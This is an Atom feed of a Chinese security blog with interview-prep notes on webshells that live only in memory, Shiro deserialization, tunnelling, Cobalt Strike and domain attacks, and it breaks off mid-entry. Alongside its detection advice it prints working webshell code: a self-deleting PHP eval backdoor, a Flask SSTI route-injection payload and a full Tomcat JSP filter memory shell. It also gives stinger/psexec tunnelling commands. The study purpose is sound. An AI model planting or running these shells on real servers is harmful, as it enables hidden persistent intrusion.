<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2024-04-01T07:13:57.886Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>面试复习五</title>
    <link href="https://liu1272.github.io/2024/04/01/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%BA%94/"/>
    <id>https://liu1272.github.io/2024/04/01/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%BA%94/</id>
    <published>2024-04-01T06:30:00.000Z</published>
    <updated>2024-04-01T07:13:57.886Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因为这段时间面试了几次，也看了很多别人的面试总结，所以抽个时间总结一下自己面试的内容。</p><h2 id="sql注入常见函数"><a href="#sql注入常见函数" class="headerlink" title="sql注入常见函数"></a>sql注入常见函数</h2><h2 id="禁用和过滤语句"><a href="#禁用和过滤语句" class="headerlink" title="禁用和过滤语句"></a>禁用和过滤语句</h2><h2 id="sqlmap常见参数"><a href="#sqlmap常见参数" class="headerlink" title="sqlmap常见参数"></a>sqlmap常见参数</h2><h2 id="sqlmapOSShell"><a href="#sqlmapOSShell" class="headerlink" title="sqlmapOSShell"></a>sqlmapOSShell</h2><h2 id="mysql写shell前置条件"><a href="#mysql写shell前置条件" class="headerlink" title="mysql写shell前置条件"></a>mysql写shell前置条件</h2><h2 id="XSS常用payload、标签"><a href="#XSS常用payload、标签" class="headerlink" title="XSS常用payload、标签"></a>XSS常用payload、标签</h2><h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h2 id="SSRF和CSRF"><a href="#SSRF和CSRF" class="headerlink" title="SSRF和CSRF"></a>SSRF和CSRF</h2><h2 id="文件上传黑名单绕过"><a href="#文件上传黑名单绕过" class="headerlink" title="文件上传黑名单绕过"></a>文件上传黑名单绕过</h2><h2 id="Redis未授权绕过"><a href="#Redis未授权绕过" class="headerlink" title="Redis未授权绕过"></a>Redis未授权绕过</h2><h2 id="shiro反序列化漏洞原理、cookie加密流程"><a href="#shiro反序列化漏洞原理、cookie加密流程" class="headerlink" title="shiro反序列化漏洞原理、cookie加密流程"></a>shiro反序列化漏洞原理、cookie加密流程</h2><h2 id="url后缀名-do-action是什么框架"><a href="#url后缀名-do-action是什么框架" class="headerlink" title="url后缀名.do.action是什么框架"></a>url后缀名.do.action是什么框架</h2><h2 id="weblogic漏洞"><a href="#weblogic漏洞" class="headerlink" title="weblogic漏洞"></a>weblogic漏洞</h2><h2 id="sql盲注告警判断成功"><a href="#sql盲注告警判断成功" class="headerlink" title="sql盲注告警判断成功"></a>sql盲注告警判断成功</h2><h2 id="从请求返回包判断文件上传告警分析上传成功"><a href="#从请求返回包判断文件上传告警分析上传成功" class="headerlink" title="从请求返回包判断文件上传告警分析上传成功"></a>从请求返回包判断文件上传告警分析上传成功</h2><h2 id="定位恶意ip怎么处理"><a href="#定位恶意ip怎么处理" class="headerlink" title="定位恶意ip怎么处理"></a>定位恶意ip怎么处理</h2><h2 id="windows查看计划任务"><a href="#windows查看计划任务" class="headerlink" title="windows查看计划任务"></a>windows查看计划任务</h2><h2 id="linux查看计划任务"><a href="#linux查看计划任务" class="headerlink" title="linux查看计划任务"></a>linux查看计划任务</h2><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><h2 id="fastjson漏洞原理"><a href="#fastjson漏洞原理" class="headerlink" title="fastjson漏洞原理"></a>fastjson漏洞原理</h2><h2 id="shiro密钥会变的情况"><a href="#shiro密钥会变的情况" class="headerlink" title="shiro密钥会变的情况"></a>shiro密钥会变的情况</h2><h2 id="后门分析流程"><a href="#后门分析流程" class="headerlink" title="后门分析流程"></a>后门分析流程</h2><h2 id="java、C-、python工具"><a href="#java、C-、python工具" class="headerlink" title="java、C++、python工具"></a>java、C++、python工具</h2><h2 id="鉴权漏洞接口"><a href="#鉴权漏洞接口" class="headerlink" title="鉴权漏洞接口"></a>鉴权漏洞接口</h2><h2 id="栈溢出、格式化字符串"><a href="#栈溢出、格式化字符串" class="headerlink" title="栈溢出、格式化字符串"></a>栈溢出、格式化字符串</h2><h2 id="网站访问重定向"><a href="#网站访问重定向" class="headerlink" title="网站访问重定向"></a>网站访问重定向</h2><h2 id="DNS劫持了怎么办"><a href="#DNS劫持了怎么办" class="headerlink" title="DNS劫持了怎么办"></a>DNS劫持了怎么办</h2><h2 id="防火墙和WAF"><a href="#防火墙和WAF" class="headerlink" title="防火墙和WAF"></a>防火墙和WAF</h2><h2 id="网络基础排障"><a href="#网络基础排障" class="headerlink" title="网络基础排障"></a>网络基础排障</h2><h2 id="无网排障"><a href="#无网排障" class="headerlink" title="无网排障"></a>无网排障</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一面问的时候大多会问技术细节，这时候照着面筋回答就好了。<br>二面三面问的是项目上的工作细节，不会详细问你一个点，而是问得很广泛，例如：渗透测试的流程、应急响应做过吗、java框架漏洞了解哪些、你以前的工作有什么成果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;因为这段时间面试了几次，也看了很多别人的面试总结，所以抽个时间总结一下自己面试的内容。&lt;/p&gt;
&lt;h2 id=&quot;sql注入常见函数&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>面试复习四</title>
    <link href="https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/"/>
    <id>https://liu1272.github.io/2024/03/25/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E5%9B%9B/</id>
    <published>2024-03-25T08:42:00.000Z</published>
    <updated>2024-03-25T17:09:38.921Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析一下内存马"><a href="#分析一下内存马" class="headerlink" title="分析一下内存马"></a>分析一下内存马</h2><h4 id="内存webshell原理"><a href="#内存webshell原理" class="headerlink" title="内存webshell原理"></a>内存webshell原理</h4><p>  其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。<br><a href="https://smms.app/image/gDXkUQbqTjysWVp" target="_blank"><img src="https://s2.loli.net/2024/03/26/gDXkUQbqTjysWVp.png" ></a></p><h4 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>  php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。<br>  对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了，会使用条件竞争写入同名文件进行克制不死马。</p><h5 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h5><p>  1. 检查所有php进程处理请求的持续时间<br>  2. 检测执行文件是否在文件系统真实存在</p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><pre class="line-numbers language-PHP"><code class="language-PHP"><?phpset_time_limit(0);ignore_user_abort(1);unlink(__FILE__);while (1) &#123;    $content = ‘<?php @eval($_POST["zzz"]) ?>’;    file_put_contents("22.php", $content);    usleep(10000);&#125;?>函数说明：    ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。    set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。    unlink(__FILE__)函数：删除文件。    file_put_contents函数：将一个字符串写入文件。    usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python内存马"><a href="#Python内存马" class="headerlink" title="Python内存马"></a>Python内存马</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>  Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到render_template_string()进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。</p><h5 id="检测思路-1"><a href="#检测思路-1" class="headerlink" title="检测思路"></a>检测思路</h5><p>  1. 查看所有内建模块中是否包含eval、exec等可以执行代码的函数如：<code>class ‘warnings.catch_warnings’</code>、<code>class &#39;site.Quitter&#39;</code>等。<br>  2. 检测<code>self.add_url_rule()</code>中特殊名字的路由如shell等。</p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><pre><code>http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell1%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;需要URL编码http://127.0.0.1:5000/index?=content&#123;&#123;a.__init__.__globals__['__builtins__']['eval']("app.add_url_rule('/shell1', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;函数说明：    __class__：返回调用的参数类型    __bases__：返回基类列表    __builtins__：内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等    __globals__：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如__init__,也可以是flask的函数如url_for等。    add_url_rule注册了一个/shell的路由，__init__相当于构造函数，定义自己的属性，通过__init__.__globals__得到他们的命名空间从而得到builtins就可以执行内置函数如eval, exec, open等。</code></pre><h4 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>  FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。<br>  当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时，该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。<br>  filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p><h5 id="filter检测思路："><a href="#filter检测思路：" class="headerlink" title="filter检测思路："></a>filter检测思路：</h5><p>  1. 带有特殊含义的filter的名字比如shell等<br>  2. Filter的优先级，filter内存马需要将filter调至最高<br>  3. 查看web.xml中有没有filter配置<br>  4. 检测特殊的classloader<br>  5. 检测classloader路径下没有class文件<br>  6. 检测Filter中的doFilter方法是否有恶意代码</p><h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><p>  代码非常长，放在文章最后面了。</p><h4 id="内存马排查思路"><a href="#内存马排查思路" class="headerlink" title="内存马排查思路"></a>内存马排查思路</h4><p>  - 先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的<br>  - 查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。<br>  - 查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。<br>  - 如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p><h2 id="如何判断是否存在Shiro漏洞"><a href="#如何判断是否存在Shiro漏洞" class="headerlink" title="如何判断是否存在Shiro漏洞"></a>如何判断是否存在Shiro漏洞</h2><p>  <strong>未登陆的情况下</strong>，请求包的 cookie 中没有 <code>rememberMe</code> 字段，返回包 set-Cookie 里也没有 <code>deleteMe</code> 字段<br>  <strong>登陆失败</strong>的话 ， 不管勾选 RememberMe 字段没有 ， 返回包都会有<code>rememberMe=deleteMe</code> 字段<br>  不勾选 RememberMe 字段 ， 登陆成功的话 ， 返回包 set-Cookie 会有<code>rememberMe=deleteMe</code> 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe字段<br>  勾选 RememberMe 字 段 ， 登陆成功的话 ， 返回包 set-Cookie 会有<code>rememberMe=deleteMe</code> 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie都会有 rememberMe 字段</p><h2 id="后渗透建立隧道"><a href="#后渗透建立隧道" class="headerlink" title="后渗透建立隧道"></a>后渗透建立隧道</h2><h3 id="常规出网隧道搭建"><a href="#常规出网隧道搭建" class="headerlink" title="常规出网隧道搭建"></a>常规出网隧道搭建</h3><p>  <strong>使用frp/ligolo等基于golang的内网穿透工具。</strong></p><ol><li>使用MSF获取Session后建立端口转发/socks4a/socks5代理。</li><li>使用regeorg/Tunna/ABPTTS等基于webshell的内网代理。<br>  其中基于frp/ligolo等内网穿透工具是出网环境最好的选择，因为此类工具中都集成TLS加密/TCP连接复用/socks5代理功能，有极高的传输效率及稳定性。</li></ol><h3 id="漏洞-机子不出网情况下怎么办？"><a href="#漏洞-机子不出网情况下怎么办？" class="headerlink" title="漏洞/机子不出网情况下怎么办？"></a>漏洞/机子不出网情况下怎么办？</h3><h4 id="正向Socks代理"><a href="#正向Socks代理" class="headerlink" title="正向Socks代理"></a>正向Socks代理</h4><ul><li>client运行在互联网的vps上，开启端口监听处理proxychains转发的tcp连接。</li><li>clinet从tcp连接中读取数据，将数据存储在post请求中发送到webshell。</li><li>webshell将http请求转发到本地的server服务器。</li><li>server为运行在不出网主机中，取出http请求中的数据，根据socks协议规则解析目的地址及端口。</li><li>server将于目的地址及端口建立tcp连接,发送数据。<br>  <strong>大部分建立连接及处理数据的工作由不出网主机中运行的server端实现，webshell只进行http请求的转发操作。</strong><br><a href="https://smms.app/image/UWL2R7pIsbrZYAM" target="_blank"><img src="https://s2.loli.net/2024/03/25/UWL2R7pIsbrZYAM.webp" ></a></li></ul><h4 id="反向端口映射"><a href="#反向端口映射" class="headerlink" title="反向端口映射"></a>反向端口映射</h4><p>  <strong>server端：</strong></p><ul><li>beacon将http请求(假设数据为AAAAAA)发送到server。</li><li>server将(AAAAAA)存储到缓存，并保持与beacon的http连接。</li></ul><p>  <strong>client端：</strong></p><ul><li>请求webshell。</li><li>webshell转发请求到server。</li><li>server将缓存的(AAAAA)填充到http应答中。</li><li>webshell将server的应答转发给client。</li><li>client从应答中获取数据(AAAAA)。</li><li>client与cobaltstike的listener建立tcp连接。</li><li>client发送(AAAAA)到cobaltstrike的listener。</li><li>conbaltstrike发送应答数据(BBBBBB)。</li><li>client将数据(BBBBB)封装到http请求中,通过webshell转发到server。</li><li>server通过之前保持的http连接将(BBBBBB)发送到beacon。<br><a href="https://smms.app/image/nKy2ecQ54PXYCZu" target="_blank"><img src="https://s2.loli.net/2024/03/25/nKy2ecQ54PXYCZu.webp" ></a><br>  可以看到我们可以通过新的方法直接使用reverse_https类型的beacon上线。上图中只是不出网的当前主机上线,如果我们需要内网其他主机上线也可以,原理图稍有变更。<br>  只要将server的监听从127.0.0.1改为0.0.0.0即可，这样的话内网其他主机就可以通过不出网主机上线了。<br><a href="https://smms.app/image/ShWNvgHBD1GEdRl" target="_blank"><img src="https://s2.loli.net/2024/03/25/ShWNvgHBD1GEdRl.webp" ></a></li></ul><h4 id="使用smb-beacon"><a href="#使用smb-beacon" class="headerlink" title="使用smb beacon"></a>使用smb beacon</h4><p>  SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。<br>  因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。<br>  SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p><h5 id="连接步骤"><a href="#连接步骤" class="headerlink" title="连接步骤"></a>连接步骤</h5><p>  1. 首先得到内网中一台主机的beacon，抓取密码后进行smb喷洒<br>  2. 得到另一台开放445端口的机器上的administrator账户密码<br>  3. 用Smb beacon使目标主机上线</p><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul><li>具有 SMB Beacon 的主机必须接受 445 端口上的连接。</li><li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</li><li>利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</li></ul><h4 id="配置listener通过HTTP代理上线"><a href="#配置listener通过HTTP代理上线" class="headerlink" title="配置listener通过HTTP代理上线"></a>配置listener通过HTTP代理上线</h4><p>  1. 使用<a href="https://github.com/snail007/goproxy">goproxy</a>项目做代理<br>  2. 上传proxy.exe到web服务器(边缘主机)，在8080端口开启http代理<br>  3. 用netsh命令将访问内网ip的822端口(必须为未使用的端口，否则会失败)的流量重定向到外网ip的8080端口</p><h4 id="使用pystinger搭建socks4代理"><a href="#使用pystinger搭建socks4代理" class="headerlink" title="使用pystinger搭建socks4代理"></a>使用<a href="https://github.com/FunnyWolf/pystinger">pystinger</a>搭建socks4代理</h4><p>  服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量</p><h5 id="连接步骤-1"><a href="#连接步骤-1" class="headerlink" title="连接步骤"></a>连接步骤</h5><p>  1. 上传proxy.php到网站目录，正常访问返回UTF-8<br>  2. 上传stinger_server.exe，执行<code>start stinger_server.exe 0.0.0.0</code><br>  3. Kali上执行<code>./stinger_client -w http://xxxxxxxxx:81/proxy.php -l 127.0.0.1 -p 60000</code><br>  4. cs中新建listener，xxxxxxxxx为web服务器内网ip，60020为转发端口<br>  5. 使用psexec横向移动，选择listener为stinger，成功上线</p><h2 id="域内攻击方法"><a href="#域内攻击方法" class="headerlink" title="域内攻击方法"></a>域内攻击方法</h2><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>  详情请看<a href="https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/#MS14-068%E6%94%BB%E5%87%BB">上一篇文章</a></p><h4 id="Roasting-攻击离线爆破密码"><a href="#Roasting-攻击离线爆破密码" class="headerlink" title="Roasting 攻击离线爆破密码"></a>Roasting 攻击离线爆破密码</h4><p>  AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 <code>Do not require Kerberos preauthentication(不需要kerberos预身份验证) </code> 。而该属性默认是没有勾选上的。<br>  预身份验证是Kerberos身份验证的第一步，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。<br>  当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。<br>  攻击时使用 Rubeus.exe 获取hash，再使用hashcat对获得的Hash进行爆破</p><h4 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a><a href="https://xz.aliyun.com/t/11555">委派攻击</a></h4><p>  原理比较简单，但是实现较为困难，以后有空再回头来学习。</p><h4 id="ntlm-relay"><a href="#ntlm-relay" class="headerlink" title="ntlm relay"></a><a href="https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/#NTLM-Relay%E6%94%BB%E5%87%BB">ntlm relay</a></h4><p>  同样是上一篇文章的内容。</p><h2 id="Java内存马代码"><a href="#Java内存马代码" class="headerlink" title="Java内存马代码"></a>Java内存马代码</h2><pre class="line-numbers language-Java"><code class="language-Java"><%@ page contentType="text/html;charset=UTF-8" language="java" %><%@ page import = "org.apache.catalina.Context" %><%@ page import = "org.apache.catalina.core.ApplicationContext" %><%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %><%@ page import = "org.apache.catalina.core.StandardContext" %><!-- tomcat 8/9 --><!-- page import = "org.apache.tomcat.util.descriptor.web.FilterMap"page import = "org.apache.tomcat.util.descriptor.web.FilterDef" --><!-- tomcat 7 --><%@ page import = "org.apache.catalina.deploy.FilterMap" %><%@ page import = "org.apache.catalina.deploy.FilterDef" %><%@ page import = "javax.servlet.*" %><%@ page import = "java.io.IOException" %><%@ page import = "java.lang.reflect.Constructor" %><%@ page import = "java.lang.reflect.Field" %><%@ page import = "java.util.Map" %><%class filterDemo implements Filter &#123;@Overridepublic void init(FilterConfig filterConfig) throws ServletException &#123;&#125;public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;String cmd = servletRequest.getParameter("cmd");if (cmd!= null) &#123;Process process = Runtime.getRuntime().exec(cmd);java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));StringBuilder stringBuilder = new StringBuilder();String line;while ((line = bufferedReader.readLine()) != null) &#123;stringBuilder.append(line + '\n');&#125;servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());servletResponse.getOutputStream().flush();servletResponse.getOutputStream().close();return;&#125;filterChain.doFilter(servletRequest, servletResponse);&#125;@Overridepublic void destroy() &#123;&#125;&#125;%><%//从org.apache.catalina.core.ApplicationContext反射获取context方法ServletContext servletContext =  request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField("context");appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField("context");stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");Configs.setAccessible(true);Map filterConfigs = (Map) Configs.get(standardContext);String name = "filterDemo";//判断是否存在filterDemo1这个filter，如果没有则准备创建if (filterConfigs.get(name) == null)&#123;//定义一些基础属性、类名、filter名等filterDemo filter = new filterDemo();FilterDef filterDef = new FilterDef();filterDef.setFilterName(name);filterDef.setFilterClass(filter.getClass().getName());filterDef.setFilter(filter);//添加filterDefstandardContext.addFilterDef(filterDef);//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*FilterMap filterMap = new FilterMap();// filterMap.addURLPattern("/*");filterMap.addURLPattern("/zzz");filterMap.setFilterName(name);filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加我们的filterMap到所有filter最前面standardContext.addFilterMapBefore(filterMap);//反射创建FilterConfig，传入standardContext与filterDefConstructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);constructor.setAccessible(true);ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);//将filter名和配置好的filterConifg传入filterConfigs.put(name,filterConfig);out.write("Inject success!");&#125;else&#123;out.write("Injected!");&#125;%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>看了三天面试题，从面试题入手查漏补缺感觉收获良多。<br>  这几天可能会有一些面试，有可能会鸽两天去复习巩固一下基础知识了。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析一下内存马&quot;&gt;&lt;a href=&quot;#分析一下内存马&quot; class=&quot;headerlink&quot; title=&quot;分析一下内存马&quot;&gt;&lt;/a&gt;分析一下内存马&lt;/h2&gt;&lt;h4 id=&quot;内存webshell原理&quot;&gt;&lt;a href=&quot;#内存webshell原理&quot; class=&quot;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>面试复习三</title>
    <link href="https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/"/>
    <id>https://liu1272.github.io/2024/03/22/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0%E4%B8%89/</id>
    <published>2024-03-22T11:14:00.000Z</published>
    <updated>2024-03-23T12:29:34.186Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shiro550和721的原理区别"><a href="#Shiro550和721的原理区别" class="headerlink" title="Shiro550和721的原理区别"></a>Shiro550和721的原理区别</h2><h4 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h4><p>  Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。<br>在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>  <strong>Payload产生的过程：</strong><br>命令 =&gt; 序列化 =&gt; AES加密 =&gt; base64编码 =&gt; RememberMe Cookie值<br>  <strong>反序列化过程：</strong><br>  获取rememberMe cookie -&gt;base64 解码-&gt;AES解密（加密密钥硬编码）-&gt;反序列化（未作过滤处理）<br>  AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥<br>利用条件：知道aes加密的key且目标服务器含有可利用的攻击链。</p><h4 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h4><p>  由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>  <strong>利用条件：</strong><br>知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。</p><h2 id="内网中抓hash的工具"><a href="#内网中抓hash的工具" class="headerlink" title="内网中抓hash的工具"></a>内网中抓hash的工具</h2><h5 id="Getpass-、wce、-mimikatz-、pwdump7，8"><a href="#Getpass-、wce、-mimikatz-、pwdump7，8" class="headerlink" title="Getpass 、wce、 mimikatz 、pwdump7，8"></a>Getpass 、wce、 mimikatz 、pwdump7，8</h5><h2 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h2><h4 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h4><p>  收集客户信息和中毒主机信息，包括样本</p><h4 id="判断攻击类型"><a href="#判断攻击类型" class="headerlink" title="判断攻击类型"></a>判断攻击类型</h4><p>  Webshell、勒索、挖矿、断网、DoS等</p><h4 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h4><p>  日志分析、进程分析、启动项分析、样本分析</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p>  近期活动、排查webshell、进程分析、配置文件、操作日志</p><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p>  特殊权限、可疑连接、/tmp/user/bin目录、进程、计划任务</p><h2 id="XXE的检测"><a href="#XXE的检测" class="headerlink" title="XXE的检测"></a>XXE的检测</h2><p>  <strong>特征：</strong></p><ul><li>特征1 — .ashx，看到url是 .ashx后缀的</li><li>特征2 — 响应体是xml</li></ul><h2 id="Tomcat实现内存马的方式"><a href="#Tomcat实现内存马的方式" class="headerlink" title="Tomcat实现内存马的方式"></a>Tomcat实现内存马的方式</h2><h4 id="Servlet-API型"><a href="#Servlet-API型" class="headerlink" title="Servlet-API型"></a>Servlet-API型</h4><p>  